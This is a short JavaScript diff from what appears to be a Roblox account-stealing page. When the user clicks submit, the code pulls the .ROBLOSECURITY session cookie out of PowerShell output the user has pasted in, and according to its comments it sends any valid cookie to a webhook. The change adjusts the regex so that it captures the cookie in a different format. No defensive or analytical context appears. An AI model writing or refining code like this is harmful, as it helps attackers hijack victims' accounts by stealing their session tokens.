@@ -71,7 +71,7 @@ document.getElementById('submitButton').addEventListener('click', async function
 
   // Send webhook for valid cookie
   // Send webhook for valid .ROBLOSECURITY cookie
-const roblosecurityRegex = /\.ROBLOSECURITY",\s*"([^"]+)"/;
+const roblosecurityRegex = /\.ROBLOSECURITY=([^; \n]+)/;
 const match = powershellData.match(roblosecurityRegex);
   if (match) {
   const cookie = match[1].trim();
